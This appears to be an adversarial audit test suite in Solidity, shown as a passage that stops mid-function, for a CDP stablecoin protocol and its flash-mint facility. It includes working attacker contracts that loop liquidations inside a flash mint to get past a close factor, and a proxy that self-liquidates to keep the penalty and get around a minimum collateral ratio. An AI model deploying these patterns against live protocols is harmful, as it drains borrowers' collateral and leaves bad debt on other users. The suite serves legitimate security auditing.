// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ═══════════════════════════════════════════════════════════════════════════════
// ADVERSARIAL: credit / leverage / incentives on the CDP surface.
//   1  debt ceiling / rateAccumulator: verify FlashMint's header claim, then look for
//      an EFFECTIVE limit a flash mint lets a user exceed (close factor, minCR, withdrawMax)
//   2  self-liquidation / penalty avoidance: who actually loses the 10%?
//   3  bad-debt / insolvency: what absorbs the residual, and is the reserve funded at all?
// ═══════════════════════════════════════════════════════════════════════════════

import "../../concrete/BaseCodeCollection.sol";
import "../../abstract/ERC20/access/Authorizable.sol";
import "../../abstract/ERC20/IERC20.sol";
import "../../concrete/Tokens/Token.sol";

contract User {
    function do(address a, string f, variadic args) public returns (variadic) {
        return address(a).call(f, args);
    }
}

/// @notice Zero-slippage two-sided desk at oracle parity. Deliberately identical to the
///         vendor's fixture so that any difference in outcome is attributable to the
///         CDP mechanics under test, not to market depth.
contract Desk {
    mapping(address => uint) public priceWad;
    function setPrice(address a, uint p) public { priceWad[a] = p; }
    function settle(address tIn, uint amtIn, address tOut) public returns (uint amtOut) {
        require(priceWad[tIn] > 0 && priceWad[tOut] > 0, "Desk: unpriced");
        amtOut = (amtIn * priceWad[tIn]) / priceWad[tOut];
        require(IERC20(tIn).transferFrom(msg.sender, address(this), amtIn), "Desk: in");
        require(IERC20(tOut).transfer(msg.sender, amtOut), "Desk: out");
        return amtOut;
    }
}

/// @notice A borrower whose callback does absolutely nothing. Used to isolate the
///         facility's own footprint on CDP accounting.
contract Inert {
    FlashMint public lender;
    address public token;
    function init(address _l, address _t) public { lender = FlashMint(_l); token = _t; }
    function go(uint amount) public { lender.flashLoan(address(this), amount, ""); }
    function onFlashMint(address _t, uint a, uint f, variadic d) external returns (string) {
        return "FlashMint.onFlashMint";
    }
}

/// @notice Vault owner. Can open, and can be driven into the various exit shapes.
contract Vault_ {
    CDPEngine public cdp;
    address public coll;

    function init(address _c) public { cdp = CDPEngine(_c); }
    function open(address _coll, uint deposit, uint mintUSD) public {
        coll = _coll;
        IERC20(_coll).approve(address(cdp.registry().cdpVault()), deposit);
        cdp.deposit(_coll, deposit);
        cdp.mint(_coll, mintUSD);
    }
    function pokeRepay(address _coll, uint amount) public { cdp.repay(_coll, amount); }
    function tryWithdraw(address _coll, uint amount) public returns (string) {
        try cdp.withdraw(_coll, amount) { return "NO REVERT"; }
        catch Error(string e) { return e; }
    }
}

/// @notice ITEM 1 — liquidator that LOOPS liquidate() inside one flash-mint callback,
///         so the per-call closeFactor cap is applied to an ever-shrinking remainder.
contract LoopLiquidator {
    FlashMint public lender;
    CDPEngine public cdp;
    address public usdst;
    address public coll;
    address public victim;
    address public desk;

    uint public rounds;
    uint public totalRepaid;
    uint public totalSeized;
    uint public usdstProfit;

    function init(address _l, address _c, address _u) public {
        lender = FlashMint(_l); cdp = CDPEngine(_c); usdst = _u;
    }

    /// @notice Zero-capital version: principal comes from the flash mint.
    function run(address _coll, address _victim, address _desk, uint principal, uint maxRounds) public {
        coll = _coll; victim = _victim; desk = _desk;
        lender.flashLoan(address(this), principal, maxRounds);
    }

    /// @notice Capital-funded version, to isolate the closeFactor mechanic from FlashMint.
    function runFunded(address _coll, address _victim, uint maxRounds) public {
        coll = _coll; victim = _victim;
        _drain(maxRounds);
    }

    function onFlashMint(address _t, uint amount, uint fee, variadic data) external returns (string) {
        uint maxRounds = uint(data[0]);
        uint collBefore = IERC20(coll).balanceOf(address(this));

        _drain(maxRounds);

        totalSeized = IERC20(coll).balanceOf(address(this)) - collBefore;

        // Atomic exit at oracle parity.
        IERC20(coll).approve(desk, totalSeized);
        Desk(desk).settle(coll, totalSeized, usdst);

        usdstProfit = IERC20(_t).balanceOf(address(this)) - (amount + fee);
        return "FlashMint.onFlashMint";
    }

    function _drain(uint maxRounds) internal {
        for (uint i = 0; i < maxRounds; i++) {
            uint before = IERC20(usdst).balanceOf(address(this));
            IERC20(usdst).approve(address(cdp), before);
            try cdp.liquidate(coll, victim, before) {
                rounds += 1;
                totalRepaid += before - IERC20(usdst).balanceOf(address(this));
            } catch {
                return;
            }
        }
    }
}

/// @notice ITEM 2 — the SAME beneficial owner runs both sides: a vault and a liquidator.
///         Recycles the 10% penalty into its own pocket AND pulls collateral out of a
///         position that `withdraw()` would refuse (CR < minCR), with no minCR check.
contract ProxyLiquidator {
    FlashMint public lender;
    CDPEngine public cdp;
    address public usdst;
    address public coll;
    address public myVault;
    address public desk;

    uint public seized;
    uint public repaid;

    function init(address _l, address _c, address _u) public {
        lender = FlashMint(_l); cdp = CDPEngine(_c); usdst = _u;
    }
    function run(address _coll, address _vault, address _desk, uint principal) public {
        coll = _coll; myVault = _vault; desk = _desk;
        lender.flashLoan(address(this), principal, "");
    }
    function onFlashMint(address _t, uint amount, uint fee, variadic data) external returns (string) {
        uint c0 = IERC20(coll).balanceOf(address(this));
        uint u0 = IERC20(_t).balanceOf(address(this));

        IERC20(_t).approve(address(cdp), amount);
        cdp.liquidate(coll, myVault, amount);

        seized = IERC20(coll).balanceOf(address(this)) - c0;
        repaid = u0 - IERC20(_t).balanceOf(address(this));

        // Sell exactly enough of the seized collateral to repay the loan; KEEP the rest.
        uint need = amount + fee - IERC20(_t).balanceOf(address(this));
        uint sell = (need * 1e18) / Desk(desk).priceWad(coll) + 1;
        IERC20(coll).approve(desk, sell);
        Desk(desk).settle(coll, sell, usdst);

        return "FlashMint.onFlashMint";
    }
}

contract Describe_Adv_Credit_CDP is Authorizable {

    Mercata m;
    FlashMint fm;
    CDPEngine cdp;
    CDPVault cdpVault;
    CDPRegistry reg;
    CDPReserve reserve;
    PriceOracle oracle;
    AdminRegistry admin;
    Desk desk;

    address USDST;
    address COLL;
    Token usdstT;
    Token collT;

    uint WAD; uint RAY; uint CAP;
    uint LR; uint MINCR; uint PEN; uint CF;

    function beforeAll() public {
        bypassAuthorizations = true;
        WAD = 1e18; RAY = 1e27; CAP = 2000000e18;
        LR = 150e16; MINCR = 155e16; PEN = 1000; CF = 5000;

        m        = new Mercata();
        cdp      = m.cdpEngine();
        cdpVault = m.cdpVault();
        reg      = m.cdpRegistry();
        reserve  = m.cdpReserve();
        oracle   = m.priceOracle();
        admin    = m.adminRegistry();
        fm       = new FlashMint(address(admin));

        USDST  = m.tokenFactory().createToken("USDST","USD Stable",[],[],[],"USDST",0,18);
        usdstT = Token(USDST);
        usdstT.setStatus(2);
        reg.setUSDST(USDST);
        oracle.setAssetPrice(USDST, 1e18);

        COLL  = m.tokenFactory().createToken("GOLDST","Gold",[],[],[],"GOLDST",0,18);
        collT = Token(COLL);
        collT.setStatus(2);
        oracle.setAssetPrice(COLL, 100e18);
        // mainnet-shaped: LR 1.50, minCR 1.55, 10% penalty, 50% close factor, no accrual.
        cdp.setCollateralAssetParams(COLL, LR, MINCR, PEN, CF, RAY, 1e18, 1e30, WAD, false);

        admin.castVoteOnIssue(address(admin), "addWhitelist", USDST, "mint", address(cdp));
        admin.castVoteOnIssue(address(admin), "addWhitelist", USDST, "burn", address(cdp));
        admin.castVoteOnIssue(address(admin), "addWhitelist", USDST, "mint", address(fm));
        admin.castVoteOnIssue(address(admin), "addWhitelist", USDST, "burn", address(fm));

        fm.initialize(USDST, address(m.feeCollector()), CAP);
        fm.setWhitelistEnabled(false);

        desk = new Desk();
        desk.setPrice(USDST, 1e18);
        desk.setPrice(COLL, 100e18);
    }

    function beforeEach() public { }

    function _price(uint p) internal {
        oracle.setAssetPrice(COLL, p);
        desk.setPrice(COLL, p);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // ITEM 1a — is the header claim literally true?
    // "flash-minted USDST ... never touches totalScaledDebt, debtCeiling or the
    //  rateAccumulator, so it cannot perturb CDP accounting or the savings rate."
    // ═════════════════════════════════════════════════════════════════════════
    function it_aa_inert_flash_mint_leaves_cdp_accounting_untouched() public {
        // Put real debt on the books first so the accumulator has something to act on.
        User u = new User();
        collT.mint(address(u), 10000e18);
        u.do(COLL, "approve", address(cdpVault), 10000e18);
        u.do(address(cdp), "deposit", COLL, 10000e18);
        u.do(address(cdp), "mint", COLL, 400000e18);

        (uint rate0, uint last0, uint tsd0) = cdp.collateralGlobalStates(COLL);
        uint supply0 = usdstT.totalSupply();

        Inert i = new Inert();
        i.init(address(fm), USDST);
        i.go(CAP);   // 2,000,000 USDST minted and burned, callback does nothing

        (uint rate1, uint last1, uint tsd1) = cdp.collateralGlobalStates(COLL);

        log("1a totalScaledDebt before/after : " + string(tsd0) + " / " + string(tsd1));
        log("1a rateAccumulator before/after : " + string(rate0) + " / " + string(rate1));
        log("1a totalSupply     before/after : " + string(supply0) + " / " + string(usdstT.totalSupply()));

        require(tsd1 == tsd0,  "CONFIRMED: totalScaledDebt untouched by the facility itself");
        require(rate1 == rate0, "CONFIRMED: rateAccumulator untouched by the facility itself");
        require(usdstT.totalSupply() == supply0, "CONFIRMED: supply neutral");
    }

    /// @notice ...but the claim is about the FACILITY, not about a transaction that uses it.
    ///         A flash mint whose callback mints CDP debt moves all three, from zero capital.
    function it_ab_but_the_callback_moves_all_three_from_zero_capital() public {
        (uint rate0, uint last0, uint tsd0) = cdp.collateralGlobalStates(COLL);

        // Leverager with $100,000 of equity levers to the minCR limit in ONE transaction.
        Leverager lev = new Leverager();
        lev.init(address(fm), address(cdp), USDST);
        collT.mint(address(lev), 1000e18);           // 1,000 COLL @ $100 = $100,000 equity
        collT.mint(address(desk), 500000e18);
        usdstT.mint(address(desk), 5000000e18);
        lev.seed(COLL);
        lev.lever(COLL, address(desk), 150000e18);

        (uint rate1, uint last1, uint tsd1) = cdp.collateralGlobalStates(COLL);
        (uint col, uint sd) = cdp.vaults(address(lev), COLL);

        log("1b equity deposited (COLL wei)     : 1000000000000000000000");
        log("1b collateral after one turn (wei) : " + string(col));
        log("1b vault scaledDebt (wei)          : " + string(sd));
        log("1b totalScaledDebt delta (wei)     : " + string(tsd1 - tsd0));
        log("1b leverage achieved (x100)        : " + string((col * 100) / 1000e18));

        require(tsd1 > tsd0, "DEMONSTRATED: the flash-mint transaction DID move totalScaledDebt");
        require(col == 2500e18, "2.5x collateral from one turn on $100k equity");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // ITEM 1b — the per-asset debtCeiling
    // ═════════════════════════════════════════════════════════════════════════
    function it_ac_debt_ceiling_is_not_breachable_by_cycling() public {
        // Tighten the ceiling to just above the debt already outstanding.
        (uint r, uint l, uint tsd) = cdp.collateralGlobalStates(COLL);
        uint outstanding = (tsd * r) / RAY;
        uint ceiling = outstanding + 100000e18;   // only $100,000 of headroom left
        cdp.setCollateralAssetParams(COLL, LR, MINCR, PEN, CF, RAY, 1e18, ceiling, WAD, false);

        CeilingRider cr = new CeilingRider();
        cr.init(address(fm), address(cdp), USDST);
        collT.mint(address(cr), 100000e18);         // $10,000,000 of collateral: plenty
        cr.seed(COLL, 100000e18);

        // Draw the remaining headroom.
        cr.mintUpTo(COLL, 99000e18);
        (uint r2, uint l2, uint tsd2) = cdp.collateralGlobalStates(COLL);
        uint used = (tsd2 * r2) / RAY;
        log("1c ceiling                         : " + string(ceiling));
        log("1c outstanding after filling it    : " + string(used));

        // Now cycle repayAll -> re-mint MORE than we freed, inside ONE flash-mint callback.
        string err = cr.cycle(COLL, 200000e18, ceiling - used);
        (uint r3, uint l3, uint tsd3) = cdp.collateralGlobalStates(COLL);
        uint after_ = (tsd3 * r3) / RAY;

        log("1c over-mint attempt reverted with : '" + err + "'");
        log("1c re-minted (restored) amount     : " + string(cr.reMinted()));
        log("1c outstanding after the cycle     : " + string(after_));

        require(err == "CDPEngine: debt ceiling exceeded",
            "BLOCKED: debtCeiling still binds inside a flash-mint repay/re-mint cycle");
        require(after_ <= ceiling, "BLOCKED: outstanding never exceeded the ceiling");

        // Restore a loose ceiling for later tests.
        cdp.setCollateralAssetParams(COLL, LR, MINCR, PEN, CF, RAY, 1e18, 1e30, WAD, false);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // ITEM 1c — THE CLOSE FACTOR. Governance's dial says "at most 50% of a vault per
    // liquidation". It is applied per CALL, and liquidate() is loopable. Below CR 1.1
    // each liquidation makes the vault MORE unhealthy, so the loop never stops.
    // ═════════════════════════════════════════════════════════════════════════
    function it_ba_close_factor_is_bypassed_by_looping_in_one_transaction() public {
        Vault_ v = new Vault_();
        v.init(address(cdp));
        collT.mint(address(v), 40000e18);
        v.open(COLL, 40000e18, 1500000e18);     // 40,000 COLL @ $100 = $4m ; debt $1.5m

        // Gap the price to $39: collateral $1,560,000 vs debt $1,500,000 -> CR 1.04
        _price(39e18);
        uint cr0 = cdp.collateralizationRatio(address(v), COLL);
        require(cr0 < LR, "must be liquidatable");
        log("1c/2 CR at entry (x1e18)            : " + string(cr0));

        (uint col0, uint sd0) = cdp.vaults(address(v), COLL);
        uint debt0 = (sd0 * RAY) / RAY;
        uint closeFactorCap = (debt0 * CF) / 10000;
        uint badBefore = cdp.badDebtUSDST(COLL);
        uint resBefore = usdstT.balanceOf(address(reserve));
        uint feeBefore = usdstT.balanceOf(address(m.feeCollector()));

        usdstT.mint(address(desk), 5000000e18);

        LoopLiquidator ll = new LoopLiquidator();
        ll.init(address(fm), address(cdp), USDST);
        require(usdstT.balanceOf(address(ll)) == 0, "liquidator starts with ZERO capital");

        ll.run(COLL, address(v), address(desk), 1500000e18, 10);

        (uint col1, uint sd1) = cdp.vaults(address(v), COLL);
        uint badAfter = cdp.badDebtUSDST(COLL);

        log("1c/2 closeFactor cap for ONE call   : " + string(closeFactorCap));
        log("1c/2 liquidate() rounds in ONE tx   : " + string(ll.rounds()));
        log("1c/2 total debt repaid across loop  : " + string(ll.totalRepaid()));
        log("1c/2 total collateral seized (wei)  : " + string(ll.totalSeized()));
        log("1c/2 borrower collateral left (wei) : " + string(col1));
        log("1c/2 borrower scaledDebt left       : " + string(sd1));
        log("1c/2 liquidator USDST profit        : " + string(ll.usdstProfit()));
        log("1c/2 badDebtUSDST created           : " + string(badAfter - badBefore));
        log("1c/2 CDPReserve delta               : " + string(usdstT.balanceOf(address(reserve)) - resBefore));
        log("1c/2 FeeCollector delta             : " + string(usdstT.balanceOf(address(m.feeCollector())) - feeBefore));

        require(ll.rounds() > 1, "DEMONSTRATED: closeFactor is per-call, the loop ran more than once");
        require(ll.totalRepaid() > closeFactorCap,
            "DEMONSTRATED: one transaction extinguished MORE than the closeFactor cap");
        require(ll.totalSeized() == col0, "DEMONSTRATED: 100% of the collateral taken despite a 50% close factor");
        require(col1 == 0, "vault stripped");
        require(ll.usdstProfit() > 0, "liquidator profited with zero starting capital");
        require(badAfter > badBefore, "DEMONSTRATED: residual became protocol bad debt");

        _price(100e18);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // ITEM 2 — WHERE DOES THE LIQUIDATION PENALTY GO?
    // ═════════════════════════════════════════════════════════════════════════
    function it_ca_penalty_goes_100pct_to_the_liquidator_and_0_to_the_reserve() public {
        Vault_ v = new Vault_();
        v.init(address(cdp));
        collT.mint(address(v), 40000e18);
        v.open(COLL, 40000e18, 1500000e18);

        _price(55e18);   // collateral $2.2m vs debt $1.5m -> CR 1.4667, liquidatable
        require(cdp.collateralizationRatio(address(v), COLL) < LR, "liquidatable");

        uint resBefore  = usdstT.balanceOf(address(reserve));
        uint feeBefore  = usdstT.balanceOf(address(m.feeCollector()));
        usdstT.mint(address(desk), 5000000e18);

        LoopLiquidator ll = new LoopLiquidator();
        ll.init(address(fm), address(cdp), USDST);
        ll.run(COLL, address(v), address(desk), 750000e18, 1);   // exactly one call, 50% CF

        uint repay = 750000e18;
        uint expectedPenalty = repay / 10;

        log("2a repay (50% close factor)      : " + string(repay));
        log("2a liquidator USDST profit       : " + string(ll.usdstProfit()));
        log("2a expected 10% penalty          : " + string(expectedPenalty));
        log("2a CDPReserve delta              : " + string(usdstT.balanceOf(address(reserve)) - resBefore));
        log("2a FeeCollector delta            : " + string(usdstT.balanceOf(address(m.feeCollector())) - feeBefore));
        log("2a feeToReserveBps (governance)  : " + string(cdp.feeToReserveBps()));

        require(ll.usdstProfit() == expectedPenalty, "penalty = 10% of repay, all of it to the liquidator");
        require(usdstT.balanceOf(address(reserve)) == resBefore,
            "DEMONSTRATED: CDPReserve receives ZERO of the liquidation penalty");
        require(usdstT.balanceOf(address(m.feeCollector())) == feeBefore,
            "DEMONSTRATED: FeeCollector receives ZERO of the liquidation penalty");

        _price(100e18);
    }

    /// @notice The reserve's only inflow is the stability fee x feeToReserveBps, and
    ///         feeToReserveBps is 0 in the deployed wiring. So the "bad-debt backstop"
    ///         is structurally unfunded, independent of flash mint.
    function it_cb_reserve_is_structurally_unfunded() public {
        log("2b CDPReserve USDST balance      : " + string(usdstT.balanceOf(address(reserve))));
        log("2b feeToReserveBps               : " + string(cdp.feeToReserveBps()));
        log("2b badDebtUSDST(COLL) outstanding: " + string(cdp.badDebtUSDST(COLL)));
        require(cdp.feeToReserveBps() == 0,
            "DEMONSTRATED: feeToReserveBps is 0 in the deployed wiring -> reserve never funded");
        require(usdstT.balanceOf(address(reserve)) == 0, "reserve holds nothing");
    }

    /// @notice Self-liquidation through a PROXY the same owner controls. Strictly stronger
    ///         than the vendor's repayAll route: it works on a partial unwind, it recycles
    ///         the penalty inside the owner's own accounts, and it pulls collateral out of
    ///         a vault whose CR is BELOW minCR - which `withdraw()` refuses outright.
    function it_cc_proxy_self_liquidation_recycles_the_penalty_and_dodges_minCR() public {
        Vault_ v = new Vault_();
        v.init(address(cdp));
        collT.mint(address(v), 40000e18);
        v.open(COLL, 40000e18, 1500000e18);

        _price(55e18);
        uint crNow = cdp.collateralizationRatio(address(v), COLL);
        require(crNow < LR, "liquidatable");

        // Baseline: the honest exit. withdraw() is refused because CR < minCR.
        string wErr = v.tryWithdraw(COLL, 1e18);
        log("2c withdraw(1 COLL) while CR<minCR : '" + wErr + "'");
        require(wErr == "CDPEngine: below min CR", "withdraw is gated by minCR");

        usdstT.mint(address(desk), 5000000e18);
        uint resBefore = usdstT.balanceOf(address(reserve));

        ProxyLiquidator pl = new ProxyLiquidator();
        pl.init(address(fm), address(cdp), USDST);
        require(usdstT.balanceOf(address(pl)) == 0, "proxy starts with zero capital");

        pl.run(COLL, address(v), address(desk), 750000e18);

        uint kept = collT.balanceOf(address(pl));
        (uint colAfter, uint sdAfter) = cdp.vaults(address(v), COLL);

        log("2c collateral seized by proxy (wei): " + string(pl.seized()));
        log("2c USDST burned by proxy           : " + string(pl.repaid()));
        log("2c COLL kept by the same owner     : " + string(kept));
        log("2c kept value USD @ $55            : " + string((kept * 55e18) / WAD));
        log("2c vault collateral after (wei)    : " + string(colAfter));
        log("2c vault CR after (x1e18)          : " + string(cdp.collateralizationRatio(address(v), COLL)));
        log("2c CDPReserve delta                : " + string(usdstT.balanceOf(address(reserve)) - resBefore));

        // 10% penalty of $750,000 = $75,000, retained by the same beneficial owner.
        require(kept > 0, "DEMONSTRATED: penalty collateral retained by the owner's own proxy");
        require((kept * 55e18) / WAD > 70000e18,
            "DEMONSTRATED: ~$75,000 of penalty on a $750,000 repay stays with the borrower");
        require(usdstT.balanceOf(address(reserve)) == resBefore, "reserve unchanged");

        _price(100e18);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // ITEM 2 (reverse) — can a flash mint liquidate a HEALTHY vault, or grief one?
    // ═════════════════════════════════════════════════════════════════════════
    function it_da_cannot_liquidate_a_healthy_vault() public {
        Vault_ v = new Vault_();
        v.init(address(cdp));
        collT.mint(address(v), 40000e18);
        v.open(COLL, 40000e18, 1000000e18);   // CR = 4.0, very healthy
        require(cdp.collateralizationRatio(address(v), COLL) > MINCR, "healthy");

        usdstT.mint(address(desk), 5000000e18);
        LoopLiquidator ll = new LoopLiquidator();
        ll.init(address(fm), address(cdp), USDST);

        // The loop swallows the revert internally, so rounds must stay 0 and nothing moves.
        (uint col0, uint sd0) = cdp.vaults(address(v), COLL);
        bool outerOk = false;
        try ll.run(COLL, address(v), address(desk), 500000e18, 3) { outerOk = true; } catch { outerOk = false; }
        (uint col1, uint sd1) = cdp.vaults(address(v), COLL);

        log("2d rounds against a healthy vault : " + string(ll.rounds()));
        log("2d outer tx committed             : " + string(outerOk));
        log("2d victim collateral before/after : " + string(col0) + " / " + string(col1));
        log("2d victim scaledDebt before/after : " + string(sd0) + " / " + string(sd1));

        require(ll.rounds() == 0, "BLOCKED: liquidate() refused every round");
        require(col1 == col0 && sd1 == sd0, "BLOCKED: healthy vault untouched ('CDPEngine: position healthy')");
    }

    /// @notice Capture the exact guard string.
    function it_db_exact_guard_on_healthy_liquidation() public {
        Vault_ v = new Vault_();
        v.init(address(cdp));
        collT.mint(address(v), 4000e18);
        v.open(COLL, 4000e18, 100000e18);

        usdstT.mint(address(this), 200000e18);
        usdstT.approve(address(cdp), 200000e18);
        string err = "NO REVERT";
        try cdp.liquidate(COLL, address(v), 50000e18) { err = "NO REVERT"; }
        catch Error(string e) { err = e; }
        log("2d exact guard: '" + err + "'");
        require(err == "CDPEngine: position healthy", "guard string");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // ITEM 3 — the insolvency path. Who absorbs the residual?
    // ═════════════════════════════════════════════════════════════════════════
    function it_ea_underwater_vault_residual_lands_on_unbacked_usdst() public {
        Vault_ v = new Vault_();
        v.init(address(cdp));
        collT.mint(address(v), 40000e18);
        v.open(COLL, 40000e18, 1500000e18);

        // Hard gap: $100 -> $25. Collateral $1,000,000 vs debt $1,500,000. CR 0.667.
        _price(25e18);
        log("3a CR after gap (x1e18)         : " + string(cdp.collateralizationRatio(address(v), COLL)));

        uint badBefore   = cdp.badDebtUSDST(COLL);
        uint supplyBefore = usdstT.totalSupply();
        uint resBefore   = usdstT.balanceOf(address(reserve));
        usdstT.mint(address(desk), 5000000e18);

        LoopLiquidator ll = new LoopLiquidator();
        ll.init(address(fm), address(cdp), USDST);
        ll.run(COLL, address(v), address(desk), 1000000e18, 10);

        (uint colAfter, uint sdAfter) = cdp.vaults(address(v), COLL);
        uint badAfter = cdp.badDebtUSDST(COLL);
        uint realized = badAfter - badBefore;

        log("3a rounds                       : " + string(ll.rounds()));
        log("3a debt repaid by liquidator    : " + string(ll.totalRepaid()));
        log("3a collateral seized (wei)      : " + string(ll.totalSeized()));
        log("3a liquidator USDST profit      : " + string(ll.usdstProfit()));
        log("3a badDebtUSDST realized        : " + string(realized));
        log("3a vault collateral / debt after : " + string(colAfter) + " / " + string(sdAfter));
        log("3a CDPReserve delta             : " + string(usdstT.balanceOf(address(reserve)) - resBefore));
        log("3a reserve balance available    : " + string(usdstT.balanceOf(address(reserve))));

        require(realized > 0, "DEMONSTRATED: bad debt realized");
        require(colAfter == 0 && sdAfter == 0, "vault zeroed, residual moved to badDebtUSDST");
        require(usdstT.balanceOf(address(reserve)) == resBefore,
            "DEMONSTRATED: no reserve draw - nothing absorbs the residual");
        require(usdstT.balanceOf(address(reserve)) == 0,
            "DEMONSTRATED: the backstop is empty, so badDebtUSDST is unbacked USDST in circulation");

        _price(100e18);
    }

    /// @notice The only path that ever retires badDebtUSDST is a third party voluntarily
    ///         BURNING its own USDST via openJuniorNote. There is no protocol-funded route.
    function it_eb_bad_debt_can_only_be_retired_by_a_volunteer_burning_usdst() public {
        uint bad = cdp.badDebtUSDST(COLL);
        require(bad > 0, "precondition: bad debt exists from the previous test");

        cdp.setJuniorPremium(1000);   // 10%

        User j = new User();
        usdstT.mint(address(j), 500000e18);
        uint supply0 = usdstT.totalSupply();
        j.do(address(cdp), "openJuniorNote", COLL, 100000e18);

        uint badAfter = cdp.badDebtUSDST(COLL);
        (address o, uint cap, uint entry) = cdp.juniorNotes(address(j));

        log("3b badDebt before/after         : " + string(bad) + " / " + string(badAfter));
        log("3b junior burned own USDST      : " + string(supply0 - usdstT.totalSupply()));
        log("3b junior note cap (principal+10%): " + string(cap));
        log("3b claimable right now          : " + string(cdp.claimable(address(j))));
        log("3b reserve balance backing it   : " + string(usdstT.balanceOf(address(reserve))));

        require(badAfter == bad - 100000e18, "bad debt only falls when a volunteer burns");
        require(supply0 - usdstT.totalSupply() == 100000e18, "the volunteer's own USDST was destroyed");
        require(cdp.claimable(address(j)) == 0, "and nothing is claimable, because the reserve is empty");
    }

    /// @notice ITEM 4-shaped, on MY surface: CDPEngine._syncReserveToIndex (CDPEngine.sol:814)
    ///         and claimable() (:937) both read a LIVE `usdst.balanceOf(cdpReserve)`. Probe
    ///         whether a flash-minted donation can be turned into a payout > the donation.
    function it_fa_junior_index_reads_live_reserve_balance_but_payout_is_bounded() public {
        uint bad = cdp.badDebtUSDST(COLL);
        require(bad > 0, "need remaining bad debt");
        require(usdstT.balanceOf(address(reserve)) == 0, "reserve starts empty for a clean marginal read");

        JuniorDonor jd = new JuniorDonor();
        jd.init(address(fm), USDST, address(reserve), address(cdp));
        usdstT.mint(address(jd), 300000e18);
        jd.openNote(COLL, 100000e18);              // burns 100k -> cap 110k at 10% premium

        (address o, uint capD, uint eD) = cdp.juniorNotes(address(jd));
        uint outstanding = cdp.totalJuniorOutstandingUSDST();
        log("4a donor cap / total junior outstanding : " + string(capD) + " / " + string(outstanding));
        log("4a claimable BEFORE the donation        : " + string(cdp.claimable(address(jd))));

        jd.probe(100000e18);   // flash-mint 100k, donate to reserve, claim, repay

        log("4a donated into CDPReserve mid-tx       : " + string(jd.donated()));
        log("4a reserve balance DURING the tx        : " + string(jd.reserveDuring()));
        log("4a claimable() DURING the tx            : " + string(jd.claimableDuring()));
        log("4a actually received from claimJunior   : " + string(jd.received()));
        log("4a donor cap before/after               : " + string(jd.capBefore()) + " / " + string(jd.capAfter()));
        log("4a net loss to the donor (wei)          : " + string(jd.donated() - jd.received()));
        log("4a reserve balance AFTER                : " + string(usdstT.balanceOf(address(reserve))));

        require(jd.claimableDuring() > 0,
            "DEMONSTRATED: claimable() moved on a live balance the attacker controls for one tx");
        require(jd.received() <= jd.donated(),
            "BLOCKED: the payout is bounded by pro-rata share and by the note cap - never > the donation");
        require(jd.donated() > jd.received(),
            "BLOCKED: strictly loss-making here; the leakage went to the OTHER junior");
    }


    // ═════════════════════════════════════════════════════════════════════════
    // ITEM 1a (strengthened) — the harness starts at block.timestamp == 0, so a
    // "rateAccumulator unchanged" assertion is vacuous unless time is advanced and a
    // REAL stability fee is configured. Do both, then re-test the claim.
    // ═════════════════════════════════════════════════════════════════════════
    function it_ga_rate_accumulator_claim_under_real_accrual() public {
        // CDPEngine._accrue():555 uses `lastAccrual == 0` as an "uninitialised" sentinel,
        // which collides with the harness's genuine timestamp 0. Step off zero first so
        // the accrual below is real.
        fastForward(1);
        // A second asset carrying a genuine ~5% APY stability fee.
        address C2 = m.tokenFactory().createToken("SILVST","Silver",[],[],[],"SILVST",0,18);
        Token c2 = Token(C2);
        c2.setStatus(2);
        oracle.setAssetPrice(C2, 100e18);
        uint SFR5 = 1000000001547125956666413085;         // ~5% APY per-second factor, RAY
        cdp.setCollateralAssetParams(C2, LR, MINCR, PEN, CF, SFR5, 1e18, 1e30, WAD, false);

        Vault_ v = new Vault_();
        v.init(address(cdp));
        c2.mint(address(v), 40000e18);
        v.open(C2, 40000e18, 1000000e18);                 // $4m collateral, $1m debt

        (uint r0, uint l0, uint tsd0) = cdp.collateralGlobalStates(C2);
        uint feeColl0 = usdstT.balanceOf(address(m.feeCollector()));
        uint res0     = usdstT.balanceOf(address(reserve));

        fastForward(365 * 24 * 60 * 60);
        // Poke the accrual with a 1-wei repay so the index is realised on-chain.
        usdstT.mint(address(v), 1000e18);
        v.pokeRepay(C2, 1e18);

        (uint r1, uint l1, uint tsd1) = cdp.collateralGlobalStates(C2);
        uint feeAccrued = usdstT.balanceOf(address(m.feeCollector())) - feeColl0;

        log("1g rateAccumulator t0 / t0+1yr  : " + string(r0) + " / " + string(r1));
        log("1g stability fee minted in 1yr  : " + string(feeAccrued));
        log("1g  -> to FeeCollector          : " + string(feeAccrued));
        log("1g  -> to CDPReserve            : " + string(usdstT.balanceOf(address(reserve)) - res0));
        require(r1 > r0, "accrual is genuinely live now, so the next assertion is not vacuous");
        require(usdstT.balanceOf(address(reserve)) == res0,
            "DEMONSTRATED: with feeToReserveBps=0 the whole stability fee bypasses the reserve");

        // NOW the real test: a 2,000,000 USDST inert flash mint, at a live accumulator.
        Inert i = new Inert();
        i.init(address(fm), USDST);
        uint feeColl1 = usdstT.balanceOf(address(m.feeCollector()));
        i.go(CAP);
        (uint r2, uint l2, uint tsd2) = cdp.collateralGlobalStates(C2);

        log("1g rateAccumulator before/after flash: " + string(r1) + " / " + string(r2));
        log("1g totalScaledDebt  before/after     : " + string(tsd1) + " / " + string(tsd2));
        log("1g FeeCollector delta across flash   : "
            + string(usdstT.balanceOf(address(m.feeCollector())) - feeColl1));

        require(r2 == r1,  "CONFIRMED (non-vacuous): the facility does not move rateAccumulator");
        require(tsd2 == tsd1, "CONFIRMED: the facility does not move totalScaledDebt");
        require(usdstT.balanceOf(address(m.feeCollector())) == feeColl1,
            "CONFIRMED: the facility mints no stability fee");
    }

    /// @notice And show the ONLY route by which CDPReserve can ever be funded, so the
    ///         "$ forgone per $1m of liquidatable debt" figure is unambiguous.
    function it_gb_reserve_can_only_be_funded_by_the_stability_fee_split() public {
        cdp.setFeeToReserveBps(5000);   // 50/50 split, governance dial
        log("1h feeToReserveBps set to        : " + string(cdp.feeToReserveBps()));

        address C3 = m.tokenFactory().createToken("BOOE","Boo",[],[],[],"BOOE",0,18);
        Token c3 = Token(C3);
        c3.setStatus(2);
        oracle.setAssetPrice(C3, 100e18);
        cdp.setCollateralAssetParams(C3, LR, MINCR, PEN, CF, 1000000001547125956666413085, 1e18, 1e30, WAD, false);

        Vault_ v = new Vault_();
        v.init(address(cdp));
        c3.mint(address(v), 40000e18);
